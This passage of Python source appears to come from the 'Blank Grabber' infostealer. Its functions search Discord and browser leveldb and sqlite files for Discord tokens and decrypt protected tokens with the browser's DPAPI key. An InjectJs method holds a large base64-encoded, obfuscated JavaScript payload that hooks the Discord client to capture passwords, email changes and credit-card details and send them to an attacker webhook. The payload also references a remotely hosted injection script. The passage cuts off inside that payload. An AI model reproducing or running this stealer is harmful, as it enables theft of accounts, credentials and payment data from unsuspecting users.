                    gifts = 'Gift Codes: (NONE)'
                else:
                    gifts = 'Gift Codes:\n\t' + '\n\t'.join(gifts)
                results.append({'USERNAME': user, 'USERID': id, 'MFA': mfa, 'EMAIL': email, 'PHONE': phone, 'VERIFIED': verified, 'NITRO': nitro_data, 'BILLING': billing, 'TOKEN': token, 'GIFTS': gifts})
        return results

    @staticmethod
    def SafeStorageSteal(path: str) -> list[str]:
        encryptedTokens = list()
        tokens = list()
        key: str = None
        levelDbPaths: list[str] = list()
        localStatePath = os.path.join(path, 'Local State')
        for root, dirs, _ in os.walk(path):
            for dir in dirs:
                if dir == 'leveldb':
                    levelDbPaths.append(os.path.join(root, dir))
        if os.path.isfile(localStatePath) and levelDbPaths:
            with open(localStatePath, errors='ignore') as file:
                jsonContent: dict = json.load(file)
            key = jsonContent['os_crypt']['encrypted_key']
            key = base64.b64decode(key)[5:]
            for levelDbPath in levelDbPaths:
                for file in os.listdir(levelDbPath):
                    if file.endswith(('.log', '.ldb')):
                        filepath = os.path.join(levelDbPath, file)
                        with open(filepath, errors='ignore') as file:
                            lines = file.readlines()
                        for line in lines:
                            if line.strip():
                                matches: list[str] = re.findall(Discord.REGEX_ENC, line)
                                for match in matches:
                                    match = match.rstrip('\\')
                                    if not match in encryptedTokens:
                                        match = base64.b64decode(match.split('dQw4w9WgXcQ:')[1].encode())
                                        encryptedTokens.append(match)
        for token in encryptedTokens:
            try:
                token = pyaes.AESModeOfOperationGCM(Syscalls.CryptUnprotectData(key), token[3:15]).decrypt(token[15:])[:-16].decode(errors='ignore')
                if token:
                    tokens.append(token)
            except Exception:
                pass
        return tokens

    @staticmethod
    def SimpleSteal(path: str) -> list[str]:
        tokens = list()
        levelDbPaths = list()
        for root, dirs, _ in os.walk(path):
            for dir in dirs:
                if dir == 'leveldb':
                    levelDbPaths.append(os.path.join(root, dir))
        for levelDbPath in levelDbPaths:
            for file in os.listdir(levelDbPath):
                if file.endswith(('.log', '.ldb')):
                    filepath = os.path.join(levelDbPath, file)
                    with open(filepath, errors='ignore') as file:
                        lines = file.readlines()
                    for line in lines:
                        if line.strip():
                            matches: list[str] = re.findall(Discord.REGEX, line.strip())
                            for match in matches:
                                match = match.rstrip('\\')
                                if not match in tokens:
                                    tokens.append(match)
        return tokens

    @staticmethod
    def FireFoxSteal(path: str) -> list[str]:
        tokens = list()
        for root, _, files in os.walk(path):
            for file in files:
                if file.lower().endswith('.sqlite'):
                    filepath = os.path.join(root, file)
                    with open(filepath, errors='ignore') as file:
                        lines = file.readlines()
                        for line in lines:
                            if line.strip():
                                matches: list[str] = re.findall(Discord.REGEX, line)
                                for match in matches:
                                    match = match.rstrip('\\')
                                    if not match in tokens:
                                        tokens.append(match)
        return tokens

    @staticmethod
    def InjectJs() -> str | None:
        check = False
        try:
            code = base64.b64decode(b'Y29uc3QgXzB4NTg3YjY2PV8weDRiYjA7ZnVuY3Rpb24gXzB4NWFjMCgpe2NvbnN0IF8weDVlZDJiOT1bJzEwNExkbEZudycsJ0h5cGVTcXVhZFx4MjBFdmVudCcsJ2RhcndpbicsJ3RvU3RyaW5nJywnKipceDBhQmlsbGluZzpceDIwKionLCcvYmlsbGluZy9wYXltZW50LXNvdXJjZXNceDIyLFx4MjBmYWxzZSk7XHgyMFx4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5zZXRSZXF1ZXN0SGVhZGVyKFx4MjJBdXRob3JpemF0aW9uXHgyMixceDIwXHgyMicsJ3N1YnN0cicsJ2V4ZWN1dGVKYXZhU2NyaXB0JywnMzUwNjhSTVJScGMnLCdodHRwczovL2FwaS5zdHJpcGUuY29tL3YqL3Rva2VucycsJ2h0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3YqL2F1dGgvbG9naW4nLCdpbmRleC5qcycsJ1x4MjcpXHgwYWlmXHgyMChmcy5leGlzdHNTeW5jKGJkUGF0aCkpXHgyMHJlcXVpcmUoYmRQYXRoKTsnLCd1bmRlZmluZWQnLCdOaXRybycsJyhVbmtub3duKScsJzU2OTJibUtob2EnLCdhcGkvd2ViaG9va3MnLCdwYXNzd29yZCcsJ2h0dHBzOi8vYXBpLnN0cmlwZS5jb20vdiovc2V0dXBfaW50ZW50cy8qL2NvbmZpcm0nLCdhdXRvX2J1eV9uaXRybycsJ2VtYmVkX2ljb24nLCcyNFJMSGR1aycsJ0Vhcmx5XHgyMFZlcmlmaWVkXHgyMEJvdFx4MjBEZXZlbG9wZXInLCdBY3RpdmVceDIwRGV2ZWxvcGVyJywnYXNzaWduJywnLi9jb3JlLmFzYXInLCdsZW5ndGgnLCc5OTknLCdceDI3KVx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMHJlcy5yZXBsYWNlKFx4MjclV0VCSE9PS19LRVklXHgyNyxceDIwXHgyNycsJzUyNXpUQWZMSScsJ2h0dHBzOi8vKi5kaXNjb3JkLmNvbS9hcGkvdiovYXBwbGljYXRpb25zL2RldGVjdGFibGUnLCcqKkFjY291bnRceDIwSW5mbyoqJywnQ2Fubm90XHgyMGNhbGxceDIwZ2V0SE1BQ1x4MjB3aXRob3V0XHgyMGZpcnN0XHgyMHNldHRpbmdceDIwSE1BQ1x4MjBrZXknLCdob3N0JywncHVzaCcsJ3dlYkNvbnRlbnRzJywnNTExNjUxODcxNzM2MjAxMjE2Jywnd2luMzInLCdwYWNrYWdlLmpzb24nLCdjYXRjaCcsJ1BBVENIJywnY2FyZFtleHBfeWVhcl0nLCdwbGF0Zm9ybScsJy9wdXJjaGFzZVx4MjIsXHgyMGZhbHNlKTtceDBhXHgyMFx4MjBceDIwXHgyMHhtbEh0dHAuc2V0UmVxdWVzdEhlYWRlcihceDIyQXV0aG9yaXphdGlvblx4MjIsXHgyMFx4MjInLCdUaW1lXHgyMHRvXHgyMGJ1eVx4MjBzb21lXHgyMG5pdHJvXHgyMGJhYnlceDIw8J+YqScsJ3Zhclx4MjB4bWxIdHRwXHgyMD1ceDIwbmV3XHgyMFhNTEh0dHBSZXF1ZXN0KCk7XHgyMFx4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5vcGVuKFx4MjJHRVRceDIyLFx4MjBceDIyJywnZW5kJywnPDpwYXlwYWw6OTUxMTM5MTg5Mzg5NDEwMzY1PicsJ1x4MjIpO1x4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5zZW5kKG51bGwpO1x4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5yZXNwb25zZVRleHQ7JywnNTExNjUxODgwODM3ODQwODk2JywncHJlbWl1bV90eXBlJywncmVxdWVzdCcsJyVXRUJIT09LX0tFWSUnLCdceDI3KVx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMHJlcy5waXBlKGZpbGUpO1x4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMGZpbGUub24oXHgyN2ZpbmlzaFx4MjcsXHgyMCgpXHgyMD0+XHgyMHtceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwZmlsZS5jbG9zZSgpO1x4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMH0pO1x4MGFceDIwXHgyMFx4MjBceDIwXHgwYVx4MjBceDIwXHgyMFx4MjB9KS5vbihceDIyZXJyb3JceDIyLFx4MjAoZXJyKVx4MjA9Plx4MjB7XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwc2V0VGltZW91dChpbml0KCksXHgyMDEwMDAwKTtceDBhXHgyMFx4MjBceDIwXHgyMH0pO1x4MGF9XHgwYXJlcXVpcmUoXHgyNycsJ2h0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMvJywnQ3JlZGl0XHgyMENhcmRceDIwTnVtYmVyOlx4MjAqKicsJ2dldEhNQUMnLCdzdHJpbmdpZnknLCdjbGFzc2ljJywnKipceDIwLVx4MjBQYXNzd29yZDpceDIwKionLCdleGlzdHNTeW5jJywnMjQyMjg2N2MtMjQ0ZC00NzZhLWJhNGYtMzZlMTk3NzU4ZDk3JywnKipceDBhT2xkXHgyMFBhc3N3b3JkOlx4MjAqKicsJ3dlYmhvb2tfcHJvdGVjdG9yX2tleScsJ2NvbnN0XHgyMGZzXHgyMD1ceDIwcmVxdWlyZShceDI3ZnNceDI3KSxceDIwaHR0cHNceDIwPVx4MjByZXF1aXJlKFx4MjdodHRwc1x4MjcpO1x4MGFjb25zdFx4MjBpbmRleEpzXHgyMD1ceDIwXHgyNycsJ3VwZGF0ZScsJ3Jlc3BvbnNlSGVhZGVycycsJ0h5cGVTcXVhZFx4MjBCcmlsbGlhbmNlJywnRGlzY29yZFx4MjBCdWdceDIwSHVudGVyXHgyMChOb3JtYWwpJywnNDk5JywnZGVmYXVsdC1zcmNceDIwXHgyNypceDI3JywndXNlcm5hbWUnLCdlbGVjdHJvbicsJ2pzU0hBJywnQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luXHgyMFx4MjcqXHgyNycsJ2pvaW4nLCdDb250ZW50cycsJ25vdycsJ1x4Mjc7XHgwYWNvbnN0XHgyMGZpbGVTaXplXHgyMD1ceDIwZnMuc3RhdFN5bmMoaW5kZXhKcykuc2l6ZVx4MGFmcy5yZWFkRmlsZVN5bmMoaW5kZXhKcyxceDIwXHgyN3V0ZjhceDI3LFx4MjAoZXJyLFx4MjBkYXRhKVx4MjA9Plx4MjB7XHgwYVx4MjBceDIwXHgyMFx4MjBpZlx4MjAoZmlsZVNpemVceDIwPFx4MjAyMDAwMFx4MjB8fFx4MjBkYXRhXHgyMD09PVx4MjBceDIybW9kdWxlLmV4cG9ydHNceDIwPVx4MjByZXF1aXJlKFx4MjcuL2NvcmUuYXNhclx4MjcpXHgyMilceDIwXHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwaW5pdCgpO1x4MGF9KVx4MGFhc3luY1x4MjBmdW5jdGlvblx4MjBpbml0KClceDIwe1x4MGFceDIwXHgyMFx4MjBceDIwaHR0cHMuZ2V0KFx4MjcnLCcud2VicCcsJ2ZpbHRlcicsJ0ludmFsaWRceDIwYmFzZTMyXHgyMGNoYXJhY3Rlclx4MjBpblx4MjBrZXknLCdzdWJzdHJpbmcnLCc1MTNWWUt5TkcnLCdybWRpclN5bmMnLCdwYXRobmFtZScsJ2NvbnRlbnQtc2VjdXJpdHktcG9saWN5JywnMTUxNjJLQk1zbGUnLCduZXdfcGFzc3dvcmQnLCdnZXRBbGxXaW5kb3dzJywnd2ViUmVxdWVzdCcsJ2RlZmF1bHQnLCdodHRwcycsJ05pdHJvXHgyMENsYXNzaWMnLCc1MjE4NDcyMzQyNDYwODI1OTknLCc5OTk5JywncHJpY2UnLCcqKk5pdHJvXHgyMGJvdWdodCEqKicsJ3BhcnNlJywnc3RhdHVzQ29kZScsJ1x4MjB8XHgyMCcsJ2dpZnRfY29kZScsJ2VuZHNXaXRoJywnY29uY2F0Jywnd2ViaG9vaycsJzE1MDQ2NDMwRUFkRUFFJywnXHg1Y2JldHRlcmRpc2NvcmRceDVjZGF0YVx4NWNiZXR0ZXJkaXNjb3JkLmFzYXInLCduaXRybycsJ3Zhclx4MjB4bWxIdHRwXHgyMD1ceDIwbmV3XHgyMFhNTEh0dHBSZXF1ZXN0KCk7XHgwYVx4MjBceDIwXHgyMFx4MjB4bWxIdHRwLm9wZW4oXHgyMkdFVFx4MjIsXHgyMFx4MjInLCdkaXNjb3JkJywnTml0cm9ceDIwQmFzaWMnLCcqKlx4MGFOZXdceDIwUGFzc3dvcmQ6XHgyMCoqJywnYXBwLmFzYXInLCdFYXJseVx4MjBTdXBwb3J0ZXInLCc1MjE4NDY5MTg2Mzc0MjA1NDUnLCdceDIyLFx4MjBmYWxzZSk7XHgwYVx4MjBceDIwXHgyMFx4MjB4bWxIdHRwLnNldFJlcXVlc3RIZWFkZXIoXHgyMkF1dGhvcml6YXRpb25ceDIyLFx4MjBceDIyJywnXHg1Y2Rpc2NvcmRfZGVza3RvcF9jb3JlXHg1Y2luZGV4LmpzJywnd3JpdGVGaWxlU3luYycsJ2Z1bmN0aW9uJywncm91bmQnLCc3ZmZmZmZmZicsJ3Rva2VucycsJ3VzZXJzL0BtZScsJ3VubGlua1N5bmMnLCdzZXRITUFDS2V5JywnKipceDBhQ1ZDOlx4MjAqKicsJ3JlYWRkaXJTeW5jJywnXHg1Y21vZHVsZXNceDVjJywncGF0aCcsJ21ldGhvZCcsJ3R5cGUnLCcqKlx4MGFCYWRnZXM6XHgyMCoqJywnZW1haWwnLCdudW1Sb3VuZHNceDIwbXVzdFx4MjBhXHgyMGludGVnZXJceDIwPj1ceDIwMScsJ0ZhaWxlZFx4MjB0b1x4MjBQdXJjaGFzZVx4MjDinYwnLCdjb250ZW50LXNlY3VyaXR5LXBvbGljeS1yZXBvcnQtb25seScsJ2VtYmVkX2NvbG9yJywnKipceDBhUGFzc3dvcmQ6XHgyMCoqJywnNDI1NTYyOWd5RGdEQicsJ2NoYXJBdCcsJ3dzczovL3JlbW90ZS1hdXRoLWdhdGV3YXkuZGlzY29yZC5nZy8qJywnRW1haWw6XHgyMCoqJywnZXhwb3J0cycsJ3NrdScsJyVXRUJIT09LSEVSRUJBU0U2NEVOQ09ERUQlJywnNTExNjUxODg1NDU5OTYzOTA0JywnaHR0cHM6Ly8qLmRpc2NvcmQuY29tL2FwaS92Ki91c2Vycy9AbWUnLCdlbWJlZF9uYW1lJywnaW5pdGlhdGlvbicsJ3BpbmdfdmFsJywnY2FyZFtleHBfbW9udGhdJywnbGVuZ2h0JywnKipUb2tlbioqJywnXHgyMik7XHgyMFx4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5zZW5kKG51bGwpO1x4MjBceDBhXHgyMFx4MjBceDIwXHgyMHhtbEh0dHAucmVzcG9uc2VUZXh0JywnYXJndicsJzM5NTE0NGliR2dDcicsJ01vZGVyYXRvclx4MjBQcm9ncmFtc1x4MjBBbHVtbmknLCdodHRwczovL2Rpc2NvcmQuY29tL2FwaS92Ki9hdXRoL2xvZ2luJywnTmV3XHgyMEVtYWlsOlx4MjAqKicsJ2JpbkxlbicsJ29uQmVmb3JlUmVxdWVzdCcsJ1BPU1QnLCdyZXBsYWNlJywnbWtkaXJTeW5jJywnU3RyaW5nXHgyMG9mXHgyMEhFWFx4MjB0eXBlXHgyMGNvbnRhaW5zXHgyMGludmFsaWRceDIwY2hhcmFjdGVycycsJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3VzZXJzL0BtZScsJ2h0dHBzOi8vc3RhdHVzLmRpc2NvcmQuY29tL2FwaS92Ki9zY2hlZHVsZWQtbWFpbnRlbmFuY2VzL3VwY29taW5nLmpzb24nLCd1cmwnLCdib29zdCcsJ3Byb3RvY29sJywnKipEaXNjb3JkXHgyMEluZm8qKicsJ2xvZ2luJywnTm9ceDIwTml0cm8nLCdhdmF0YXInLCdxdWVyeXN0cmluZycsJ3Zhclx4MjB4bWxIdHRwXHgyMD1ceDIwbmV3XHgyMFhNTEh0dHBSZXF1ZXN0KCk7XHgwYVx4MjBceDIwXHgyMFx4MjB4bWxIdHRwLm9wZW4oXHgyMlBPU1RceDIyLFx4MjBceDIyaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvc3RvcmUvc2t1cy8nLCdzbGljZScsJ2ZsYWdzJywnZGlzY3JpbWluYXRvcicsJ2Vycm9yJywnTml0cm9ceDIwVHlwZTpceDIwKionLCdwaW5nX29uX3J1bicsJ2NvbnRlbnQnLCdodHRwczovLyouZGlzY29yZC5jb20vYXBpL3YqL3VzZXJzL0BtZS9saWJyYXJ5JywnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0JsYW5rLWMvRGlzY29yZC1JbmplY3Rpb24tQkcvbWFpbi9pbmplY3Rpb24tb2JmdXNjYXRlZC5qcycsJ1x4MjIpO1x4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5zZXRSZXF1ZXN0SGVhZGVyKFx4MjdDb250ZW50LVR5cGVceDI3LFx4MjBceDI3YXBwbGljYXRpb24vanNvblx4MjcpO1x4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5zZW5kKEpTT04uc3RyaW5naWZ5KCcsJ2J5dGVzJywnKipFbWFpbFx4MjBDaGFuZ2VkKionLCcqKlBhc3N3b3JkXHgyMENoYW5nZWQqKicsJ0FQUERBVEEnLCdpbmplY3Rpb25fdXJsJywndXNkJywnMjI1dXpTUFlLJywnd2luZG93LndlYnBhY2tKc29ucD8oZ2c9d2luZG93LndlYnBhY2tKc29ucC5wdXNoKFtbXSx7Z2V0X3JlcXVpcmU6KGEsYixjKT0+YS5leHBvcnRzPWN9LFtbXHgyMmdldF9yZXF1aXJlXHgyMl1dXSksZGVsZXRlXHgyMGdnLm0uZ2V0X3JlcXVpcmUsZGVsZXRlXHgyMGdnLmMuZ2V0X3JlcXVpcmUpOndpbmRvdy53ZWJwYWNrQ2h1bmtkaXNjb3JkX2FwcCYmd2luZG93LndlYnBhY2tDaHVua2Rpc2NvcmRfYXBwLnB1c2goW1tNYXRoLnJhbmRvbSgpXSx7fSxhPT57Z2c9YX1dKTtmdW5jdGlvblx4MjBMb2dPdXQoKXsoZnVuY3Rpb24oYSl7Y29uc3RceDIwYj1ceDIyc3RyaW5nXHgyMj09dHlwZW9mXHgyMGE/YTpudWxsO2Zvcihjb25zdFx4MjBjXHgyMGluXHgyMGdnLmMpaWYoZ2cuYy5oYXNPd25Qcm9wZXJ0eShjKSl7Y29uc3RceDIwZD1nZy5jW2NdLmV4cG9ydHM7aWYoZCYmZC5fX2VzTW9kdWxlJiZkLmRlZmF1bHQmJihiP2QuZGVmYXVsdFtiXTphKGQuZGVmYXVsdCkpKXJldHVyblx4MjBkLmRlZmF1bHQ7aWYoZCYmKGI/ZFtiXTphKGQpKSlyZXR1cm5ceDIwZH1yZXR1cm5ceDIwbnVsbH0pKFx4MjJsb2dpblx4MjIpLmxvZ291dCgpfUxvZ091dCgpOycsJ21vbnRoJywnYXBpJywnb25Db21wbGV0ZWQnLCdEaXNjb3JkXHgyMFN0YWZmJywnbWF4Jywnc3RhcnRzV2l0aCcsJ2h0dHBzOi8vYXBpLnN0cmlwZS5jb20vdiovcGF5bWVudF9pbnRlbnRzLyovY29uZmlybScsJ2NvbmZpcm0nLCdodHRwczovL2Rpc2NvcmQuZ2lmdC8nLCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQmxhbmstYy9CbGFuay1HcmFiYmVyL21haW4vLmdpdGh1Yi93b3JrZmxvd3MvaW1hZ2UucG5nJywnZGVmYXVsdFNlc3Npb24nLCdzZXAnLCdmbG9vcicsJzMwODc4NzcxRVpFbEZWJywnZm9yRWFjaCcsJ3NwbGl0JywnSHlwZVNxdWFkXHgyMEJyYXZlcnknLCdBdXRob3JpemF0aW9uJywnYXBwbGljYXRpb24vanNvbicsJ3llYXInLCd2YWx1ZSddO18weDVhYzA9ZnVuY3Rpb24oKXtyZXR1cm4gXzB4NWVkMmI5O307cmV0dXJuIF8weDVhYzAoKTt9KGZ1bmN0aW9uKF8weDE5N2UwMCxfMHg1NzU1ZDEpe2NvbnN0IF8weDIxNDE1MT1fMHg0YmIwLF8weDM4ZjU2YT1fMHgxOTdlMDAoKTt3aGlsZSghIVtdKXt0cnl7Y29uc3QgXzB4MWE2Y2M1PXBhcnNlSW50KF8weDIxNDE1MSgweDFkMCkpLzB4MSoocGFyc2VJbnQoXzB4MjE0MTUxKDB4MWUwKSkvMHgyKSstcGFyc2VJbnQoXzB4MjE0MTUxKDB4MTRjKSkvMHgzKihwYXJzZUludChfMHgyMTQxNTEoMHgxZDgpKS8weDQpK3BhcnNlSW50KF8weDIxNDE1MSgweDFlZSkpLzB4NSooLXBhcnNlSW50KF8weDIxNDE1MSgweDE1MCkpLzB4NikrLXBhcnNlSW50KF8weDIxNDE1MSgweDE4MykpLzB4NystcGFyc2VJbnQoXzB4MjE0MTUxKDB4MTk0KSkvMHg4KihwYXJzZUludChfMHgyMTQxNTEoMHgxYjkpKS8weDkpKy1wYXJzZUludChfMHgyMTQxNTEoMHgxNjIpKS8weGErcGFyc2VJbnQoXzB4MjE0MTUxKDB4MWM4KSkvMHhiKihwYXJzZUludChfMHgyMTQxNTEoMHgxZTYpKS8weGMpO2lmKF8weDFhNmNjNT09PV8weDU3NTVkMSlicmVhaztlbHNlIF8weDM4ZjU2YVsncHVzaCddKF8weDM4ZjU2YVsnc2hpZnQnXSgpKTt9Y2F0Y2goXzB4MTE4Y2FjKXtfMHgzOGY1NmFbJ3B1c2gnXShfMHgzOGY1NmFbJ3NoaWZ0J10oKSk7fX19KF8weDVhYzAsMHhjMmViZikpO2NvbnN0IGFyZ3M9cHJvY2Vzc1tfMHg1ODdiNjYoMHgxOTMpXSxmcz1yZXF1aXJlKCdmcycpLHBhdGg9cmVxdWlyZShfMHg1ODdiNjYoMHgxNzkpKSxodHRwcz1yZXF1aXJlKF8weDU4N2I2NigweDE1NSkpLHF1ZXJ5c3RyaW5nPXJlcXVpcmUoXzB4NTg3YjY2KDB4MWE3KSkse0Jyb3dzZXJXaW5kb3csc2Vzc2lvbn09cmVxdWlyZShfMHg1ODdiNjYoMHgxNDEpKSxlbmNvZGVkSG9vaz1fMHg1ODdiNjYoMHgxODkpLGNvbmZpZz17J3dlYmhvb2snOmF0b2IoZW5jb2RlZEhvb2spLCd3ZWJob29rX3Byb3RlY3Rvcl9rZXknOl8weDU4N2I2NigweDEyZCksJ2F1dG9fYnV5X25pdHJvJzohW10sJ3Bpbmdfb25fcnVuJzohIVtdLCdwaW5nX3ZhbCc6J0BldmVyeW9uZScsJ2VtYmVkX25hbWUnOidCbGFua1x4MjBHcmFiYmVyXHgyMEluamVjdGlvbicsJ2VtYmVkX2ljb24nOl8weDU4N2I2NigweDFjNCksJ2VtYmVkX2NvbG9yJzoweDU2MGRkYywnaW5qZWN0aW9uX3VybCc6XzB4NTg3YjY2KDB4MWIxKSwnYXBpJzpfMHg1ODdiNjYoMHgxOWUpLCduaXRybyc6eydib29zdCc6eyd5ZWFyJzp7J2lkJzpfMHg1ODdiNjYoMHgxNTcpLCdza3UnOl8weDU4N2I2NigweDE4YSksJ3ByaWNlJzpfMHg1ODdiNjYoMHgxNTgpfSwnbW9udGgnOnsnaWQnOl8weDU4N2I2NigweDE1NyksJ3NrdSc6XzB4NTg3YjY2KDB4MTJhKSwncHJpY2UnOl8weDU4N2I2NigweDFlYyl9fSwnY2xhc3NpYyc6eydtb250aCc6eydpZCc6XzB4NTg3YjY2KDB4MTZiKSwnc2t1JzpfMHg1ODdiNjYoMHgxZjUpLCdwcmljZSc6XzB4NTg3YjY2KDB4MTNlKX19fSwnZmlsdGVyJzp7J3VybHMnOlsnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdiovdXNlcnMvQG1lJywnaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdiovdXNlcnMvQG1lJyxfMHg1ODdiNjYoMHgxOGIpLF8weDU4N2I2NigweDFkYSksXzB4NTg3YjY2KDB4MTk2KSwnaHR0cHM6Ly8qLmRpc2NvcmQuY29tL2FwaS92Ki9hdXRoL2xvZ2luJywnaHR0cHM6Ly9hcGkuYnJhaW50cmVlZ2F0ZXdheS5jb20vbWVyY2hhbnRzLzQ5cHAycnA0cGh5bTczODcvY2xpZW50X2FwaS92Ki9wYXltZW50X21ldGhvZHMvcGF5cGFsX2FjY291bnRzJyxfMHg1ODdiNjYoMHgxZDkpLF8weDU4N2I2NigweDFlMyksXzB4NTg3YjY2KDB4MWMxKV19LCdmaWx0ZXIyJzp7J3VybHMnOltfMHg1ODdiNjYoMHgxOWYpLF8weDU4N2I2NigweDFlZiksJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3YqL2FwcGxpY2F0aW9ucy9kZXRlY3RhYmxlJyxfMHg1ODdiNjYoMHgxYjApLCdodHRwczovL2Rpc2NvcmQuY29tL2FwaS92Ki91c2Vycy9AbWUvbGlicmFyeScsXzB4NTg3YjY2KDB4MTg1KV19fTtmdW5jdGlvbiBwYXJpdHlfMzIoXzB4NTMwNmU0LF8weGE5MTlhYixfMHg4NmU5MTIpe3JldHVybiBfMHg1MzA2ZTReXzB4YTkxOWFiXl8weDg2ZTkxMjt9ZnVuY3Rpb24gY2hfMzIoXzB4MjFlODUzLF8weDVlODhlNCxfMHgxOGViYzQpe3JldHVybiBfMHgyMWU4NTMmXzB4NWU4OGU0Xn5fMHgyMWU4NTMmXzB4MThlYmM0O31mdW5jdGlvbiBtYWpfMzIoXzB4MjU2YjYxLF8weDMwNWExYSxfMHg0MmVhNWEpe3JldHVybiBfMHgyNTZiNjEmXzB4MzA1YTFhXl8weDI1NmI2MSZfMHg0MmVhNWFeXzB4MzA1YTFhJl8weDQyZWE1YTt9ZnVuY3Rpb24gcm90bF8zMihfMHg0NDI0MTUsXzB4NGY0Mjc3KXtyZXR1cm4gXzB4NDQyNDE1PDxfMHg0ZjQyNzd8XzB4NDQyNDE1Pj4+MHgyMC1fMHg0ZjQyNzc7fWZ1bmN0aW9uIHNhZmVBZGRfMzJfMihfMHgzMDhlZTIsXzB4ZTc1MGNmKXt2YXIgXzB4MmM3NmI0PShfMHgzMDhlZTImMHhmZmZmKSsoXzB4ZTc1MGNmJjB4ZmZmZiksXzB4YWU2MDA2PShfMHgzMDhlZTI+Pj4weDEwKSsoXzB4ZTc1MGNmPj4+MHgxMCkrKF8weDJjNzZiND4+PjB4MTApO3JldHVybihfMHhhZTYwMDYmMHhmZmZmKTw8MHgxMHxfMHgyYzc2YjQmMHhmZmZmO31mdW5jdGlvbiBzYWZlQWRkXzMyXzUoXzB4MzY2YmY3LF8weDRhZWE1YyxfMHgxYjFlZjcsXzB4MTEwMGVlLF8weDU1MjUzYyl7dmFyIF8weDI2NmRhNT0oXzB4MzY2YmY3JjB4ZmZmZikrKF8weDRhZWE1YyYweGZmZmYpKyhfMHgxYjFlZjcmMHhmZmZmKSsoXzB4MTEwMGVlJjB4ZmZmZikrKF8weDU1MjUzYyYweGZmZmYpLF8weDJjMWI3ZT0oXzB4MzY2YmY3Pj4+MHgxMCkrKF8weDRhZWE1Yz4+PjB4MTApKyhfMHgxYjFlZjc+Pj4weDEwKSsoXzB4MTEwMGVlPj4+MHgxMCkrKF8weDU1MjUzYz4+PjB4MTApKyhfMHgyNjZkYTU+Pj4weDEwKTtyZXR1cm4oXzB4MmMxYjdlJjB4ZmZmZik8PDB4MTB8XzB4MjY2ZGE1JjB4ZmZmZjt9ZnVuY3Rpb24gYmluYjJoZXgoXzB4MjBlMGE0KXtjb25zdCBfMHgzMjQ2ZWY9XzB4NTg3YjY2O3ZhciBfMHgzZDY1NWU9JzAxMjM0NTY3ODlhYmNkZWYnLF8weDIwM2Q2ZD0nJyxfMHg0YWUxY2E9XzB4MjBlMGE0WydsZW5ndGgnXSoweDQsXzB4M2ZlN2JhLF8weDM5YzU0ZTtmb3IoXzB4M2ZlN2JhPTB4MDtfMHgzZmU3YmE8XzB4NGFlMWNhO18weDNmZTdiYSs9MHgxKXtfMHgzOWM1NGU9XzB4MjBlMGE0W18weDNmZTdiYT4+PjB4Ml0+Pj4oMHgzLV8weDNmZTdiYSUweDQpKjB4OCxfMHgyMDNkNmQrPV8weDNkNjU1ZVsnY2hhckF0J10oXzB4MzljNTRlPj4+MHg0JjB4ZikrXzB4M2Q2NTVlW18weDMyNDZlZigweDE4NCldKF8weDM5YzU0ZSYweGYpO31yZXR1cm4gXzB4MjAzZDZkO31mdW5jdGlvbiBnZXRIKCl7cmV0dXJuWzB4Njc0NTIzMDEsMHhlZmNkYWI4OSwweDk4YmFkY2ZlLDB4MTAzMjU0NzYsMHhjM2QyZTFmMF07fWZ1bmN0aW9uIHJvdW5kU0hBMShfMHgyMGFhYzIsXzB4NTFhNzQwKXt2YXIgXzB4NDRmMzAyPVtdLF8weDVkMmUzZCxfMHgyZmEzYzUsXzB4NGM1OTVhLF8weDIyNWM3NCxfMHhjMDk2NjIsXzB4MzliM2NhLF8weDRmMzg2ZT1jaF8zMixfMHg0OWU3MzQ9cGFyaXR5XzMyLF8weDU5OGU4NT1tYWpfMzIsXzB4NGNhMTZmPXJvdGxfMzIsXzB4NWNiNmY0PXNhZmVBZGRfMzJfMixfMHgzMzc4M2MsXzB4NDAwMDhkPXNhZmVBZGRfMzJfNTtfMHg1ZDJlM2Q9XzB4NTFhNzQwWzB4MF0sXzB4MmZhM2M1PV8weDUxYTc0MFsweDFdLF8weDRjNTk1YT1fMHg1MWE3NDBbMHgyXSxfMHgyMjVjNzQ9XzB4NTFhNzQwWzB4M10sXzB4YzA5NjYyPV8weDUxYTc0MFsweDRdO2ZvcihfMHgzMzc4M2M9MHgwO18weDMzNzgzYzwweDUwO18weDMzNzgzYys9MHgxKXtfMHgzMzc4M2M8MHgxMD9fMHg0NGYzMDJbXzB4MzM3ODNjXT1fMHgyMGFhYzJbXzB4MzM3ODNjXTpfMHg0NGYzMDJbXzB4MzM3ODNjXT1fMHg0Y2ExNmYoXzB4NDRmMzAyW18weDMzNzgzYy0weDNdXl8weDQ0ZjMwMltfMHgzMzc4M2MtMHg4XV5fMHg0NGYzMDJbXzB4MzM3ODNjLTB4ZV1eXzB4NDRmMzAyW18weDMzNzgzYy0weDEwXSwweDEpO2lmKF8weDMzNzgzYzwweDE0KV8weDM5YjNjYT1fMHg0MDAwOGQoXzB4NGNhMTZmKF8weDVkMmUzZCwweDUpLF8weDRmMzg2ZShfMHgyZmEzY